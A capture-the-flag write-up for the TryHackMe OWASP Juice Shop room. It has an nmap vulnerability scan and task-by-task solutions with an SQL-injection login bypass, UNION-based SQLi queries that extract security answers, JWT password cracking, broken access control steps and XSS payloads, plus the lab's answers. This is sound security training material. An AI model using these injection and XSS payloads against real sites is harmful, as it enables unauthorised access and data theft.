# OWASP Juice Shop (tryhackme)

## nmap initial scan
```
# Nmap 7.60 scan initiated Mon May 25 13:21:02 2020 as: nmap -sC -sV -p- --script=default,vuln -oN nmap/output -T3 10.10.12.237
Pre-scan script results:
| broadcast-avahi-dos: 
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Nmap scan report for 10.10.12.237
Host is up (0.22s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 bf:e2:a7:4c:4f:43:49:7d:32:bb:79:47:cf:3e:4c:e9 (RSA)
|   256 a9:06:05:52:66:d9:ef:07:72:3d:bc:0c:db:d9:eb:a9 (ECDSA)
|_  256 a9:24:08:59:14:be:4a:8c:e4:79:2f:56:8c:3a:99:a9 (EdDSA)
80/tcp open  http    Node.js Express framework
|_http-aspnet-debug: ERROR: Script execution failed (use -d to debug)
|_http-cors: HEAD GET POST PUT DELETE PATCH
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-majordomo2-dir-traversal: ERROR: Script execution failed (use -d to debug)
| http-phpmyadmin-dir-traversal: 
|   VULNERABLE:
|   phpMyAdmin grab_globals.lib.php subform Parameter Traversal Local File Inclusion
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2005-3299
|       PHP file inclusion vulnerability in grab_globals.lib.php in phpMyAdmin 2.6.4 and 2.6.4-pl1 allows remote attackers to include local files via the $__redirect parameter, possibly involving the subform array.
|       
|     Disclosure date: 2005-10-nil
|     Extra information:
|       ../../../../../etc/passwd :
|   <!doctype html>
|   <html lang="en">
|   <head>
|     <meta charset="utf-8">
|     <title>OWASP Juice Shop</title>
|     <base href="/">
|     <meta name="description" content="An intentionally insecure JavaScript Web Application">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <link id="favicon" rel="icon" type="image/x-icon" href="favicon.ico">
|     <link href="https://fonts.googleapis.com/icon?family=Material Icons" rel="stylesheet">
|     <link rel="stylesheet" type="text/css" href="//cdnjs.cloudflare.com/ajax/libs/cookieconsent2/3.1.0/cookieconsent.min.css" />
|     <script src="//cdnjs.cloudflare.com/ajax/libs/cookieconsent2/3.1.0/cookieconsent.min.js"></script>
|     <script>
|       window.addEventListener("load", function(){
|         window.cookieconsent.initialise({
|           "palette": {
|             "popup": { "background": "#546e7a", "text": "#ffffff" },
|             "button": { "background": "#558b2f", "text": "#ffffff" }
|           },
|           "theme": "classic",
|           "position": "bottom-right",
|           "content": { "message": "This website uses fruit cookies to ensure you get the juiciest tracking experience.", "dismiss": "Me want it!", "link": "But me wait!", "href": "https://www.youtube.com/watch?v=9PnbKL3wuH4" }
|         })});
|     </script>
|   <link rel="stylesheet" href="styles.css"></head>
|   <body class="mat-app-background bluegrey-lightgreen-theme">
|     <app-root></app-root>
|   <script type="text/javascript" src="runtime.js"></script><script type="text/javascript" src="polyfills.js"></script><script type="text/javascript" src="vendor.js"></script><script type="text/javascript" src="main.js"></script></body>
|   </html>
|   
|     References:
|       http://www.exploit-db.com/exploits/1244/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-3299
| http-robots.txt: 1 disallowed entry 
|_/ftp
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-title: OWASP Juice Shop
| http-vuln-cve2011-3192: 
|   VULNERABLE:
|   Apache byterange filter DoS
|     State: VULNERABLE
|     IDs:  CVE:CVE-2011-3192  OSVDB:74721
|       The Apache web server is vulnerable to a denial of service attack when numerous
|       overlapping byte ranges are requested.
|     Disclosure date: 2011-08-19
|     References:
|       http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3192
|       http://seclists.org/fulldisclosure/2011/Aug/175
|       http://osvdb.org/74721
|       http://nessus.org/plugins/index.php?view=single&id=55976
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3192
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon May 25 14:04:04 2020 -- 1 IP address (1 host up) scanned in 2582.50 seconds

```


### [Task 1] Connect To Our Network
1. Connect to our Network
```
No answer needed
```

### [Task 2] Configure Burp(If you haven't already)
1. Set up Burp
```
No answer needed
```

### [Task 3] Walk through the application
1. Walk through the application and use the functionality available
```
No answer needed
```

### [Task 4] Injection
1. Log in with the administrator's user account using SQL Injection
```
No aswer needed
```

To log in to the administrator account we just need trick the query send through the backend to the database system

What the standard the query supposed to look like...
```
SELECT * FROM <users> WHERE email='$email' AND password='md5($password)'
```
With this knowledge we can manipulate the $email variable by closing the string and appending what we want to bypass that, and just commnent the other stuff that we don't want

Query:
```
'OR 1=1 -- -
```

### [Task 5] Broken Authentication
1. reset Jim's password using the forgotten password mechanism - what was the answer to the secret question?
```
samuel
```

First way:
SQLi from search
Query progress
```
/rest/product/search?q='

')) UNION SELECT 1,2,3,4,5,6,7,8 -- -

lalala')) UNION SELECT name,tbl_name,3,4,5,6,7,8 FROM SQLITE_MASTER WHERE type="table"/*

lalala'))+UNION+SELECT+sql,tbl_name,3,4,5,6,7,8+FROM+SQLITE_MASTER+WHERE+tbl_name%3d"SecurityAnswers"/*

lalala')) UNION SELECT id,UserId,answer,4,5,6,7,8 FROM SecurityAnswers/*

47bd24c3702cf53594f1e14320f798512b3cbb492fdae4305fe30607f81588cf
```


Second way:
look at main.js, see that there is a  path to administration, then look at the recycling order from user 2 (jim). there's said it's from starfleet, star trek reference just search for the eldest sibling...

2. What is the administrator password?
```
admin123
```

When we logged in as the administrator we can see from the request on burpsuite that there is somesort of base64 token, but not all the string can be decoded by base64, looking at the starting string after decoding it we can see that it is a JWT token. And there's a lot of information from that token... and there is a hashed password there... MD5 hashed password to be exact. then... just dehash that using john, or hashcat, or any other tools you want

### [Task 6] Sensitive Data Exposure
1. Access a confidential document and enter the name of the first file with the extension ".md"
```
acquisitions.md
```

There is a robots.txt file and there we can see that there is /ftp directory...

### [Task 7] Broken Access Control
1. Access the administration section of the store - What is the name of the page?
```
administration
```

Look at main.js, there is a path through administrator

2. Access someone else's basket
```
No answer needed
```

Check your browser storage, there is an id equavalent to UserId there

3. Get rid of all 5 star customer feedback
```
No answer needed
```

Just delete it from administration page

### [Task 8] Cross Site Scripting(XSS)
1. Carry out reflected XSS using Tracking Orders
```
No answer needed
```

Injection
```
<iframe src="javascript:alert(`xss`)">
```

2. Carry out XSS using the Search field?
```
No answer needed
```

Injection
```
<img src=x onerror=alert('XSS');>
```


Good reference:
[Challenge solutions - Pwning OWASP Juice Shop](https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/appendix/solutions.html)